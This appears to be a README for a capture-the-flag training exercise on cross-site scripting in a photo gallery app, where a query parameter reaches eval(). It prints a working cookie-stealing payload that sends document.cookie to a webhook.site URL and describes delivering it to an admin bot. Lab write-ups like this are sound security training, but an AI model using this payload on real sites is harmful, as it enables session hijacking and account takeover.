# 0x0a. Advanced Web Attack Techniques - XSS

## Description
This project explores Cross-Site Scripting (XSS) vulnerabilities in a photo gallery web application. The goal is to exploit an XSS vulnerability to capture the administrator's cookie and retrieve the flag.

## Tasks

### 0. Advanced XSS Challenge - Photo Gallery Exploitation
Exploit an XSS vulnerability in the provided photo gallery web application to capture the administrator's cookie.

- **Vulnerability:** The `holberton` query parameter is passed directly to `eval()` without sanitization
- **Attack Vector:** Crafted a malicious URL with JavaScript payload in the `holberton` parameter
- **Payload:** `new Image().src="https://webhook.site/<UUID>?c="+document.cookie`
- **Delivery:** Submitted the malicious URL via the `/report` endpoint (Suggestion Page)
- **Result:** Admin bot visited the URL, triggering the XSS, which sent the cookie to the webhook

## Files

| File | Description |
|------|-------------|
| `0-flag.txt` | Flag captured from admin's cookie |

## Author
- **Ahmet Cayci**
